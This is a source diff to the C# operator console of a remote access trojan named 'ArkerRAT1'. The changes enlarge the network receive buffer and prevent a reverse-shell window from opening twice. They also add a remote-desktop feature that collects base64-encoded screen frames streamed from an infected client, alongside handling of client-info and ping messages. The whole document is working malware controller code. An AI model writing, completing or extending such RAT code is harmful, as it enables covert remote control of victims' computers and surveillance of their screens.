@@ -55,9 +55,9 @@ namespace ArkerRAT1
             try
             {
                 while (!token.IsCancellationRequested)
-            {
+                {
                
-                    byte[] data = new byte[1024];
+                    byte[] data = new byte[131072];
                     await clientStream.ReadAsync(data, 0, data.Length);
                     DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
                     await clientStream.FlushAsync();
@@ -141,15 +141,34 @@ namespace ArkerRAT1
         }
 
         public ReverseShellWindow reverseShellWindow;
-
+        public bool reverseShellWindowIsAlreadyOpen = false;
         public void StartReverseShell(object sender, EventArgs e)
-        {
-            reverseShellWindow = new ReverseShellWindow(this);
-            reverseShellWindow.WindowState = WindowState.Normal;
-            reverseShellWindow.Activate();
-            reverseShellWindow.Show();
+        {   if(!reverseShellWindowIsAlreadyOpen)
+            {
+                reverseShellWindow = new ReverseShellWindow(this);
+                reverseShellWindow.WindowState = WindowState.Normal;
+                reverseShellWindow.Activate();
+                reverseShellWindow.Show();
+            }
         }
 
+        public RemoteDesktopWindow remoteDesktopWindow;
+        public bool remoteDesktopWindowIsAlreadyOpen = false;
+        public void StartRemoteDesktop(object sender, EventArgs e)
+        {
+            if (!remoteDesktopWindowIsAlreadyOpen)
+            {
+                remoteDesktopWindow = new RemoteDesktopWindow(this);
+                remoteDesktopWindow.WindowState = WindowState.Normal;
+                remoteDesktopWindow.Activate();
+                remoteDesktopWindow.Show();
+            }
+        }
+
+
+
+
+        public List<string> base64strings = new List<string>();
         private async void DecideCyberTool(string data)
         {
             if (data.Contains("§ReverseShell§"))
@@ -159,17 +178,36 @@ namespace ArkerRAT1
                 await reverseShellWindow.ReversShellFunction();
             }
 
+            if (data.Contains("§RemoteDesktop§")&& this.remoteDesktopWindowIsAlreadyOpen == true )
+            {
+                //Say the frame is fully reicived.
+                string remoteDesktopFrame = data;
+               
+
+                //Assing data to remotedesktop class.
+                remoteDesktopFrame=remoteDesktopFrame.Replace("§Ping§", String.Empty);
+                remoteDesktopFrame = remoteDesktopFrame.Replace("§Ping§", String.Empty);
+                base64strings.Add(remoteDesktopFrame);
+
+                if (remoteDesktopFrame.Contains("§RemoteDesktopFrameDone§"))
+                {
+                    await remoteDesktopWindow.RemoteDesktopFunction();
+                    base64strings.Clear();
+                }
+                remoteDesktopFrame = "";
+            }
+
+
             if (data.Contains("§Ping§"))
             {
                 whenToStartPinging = "§Ping§";
             }
-
+                
             if (data.Contains("§ClientInfo§"))
             {
                 string tempString = data;
 
                 clientInfo = tempString.Replace("§ClientInfo§", "");
-
             }
         }
     }
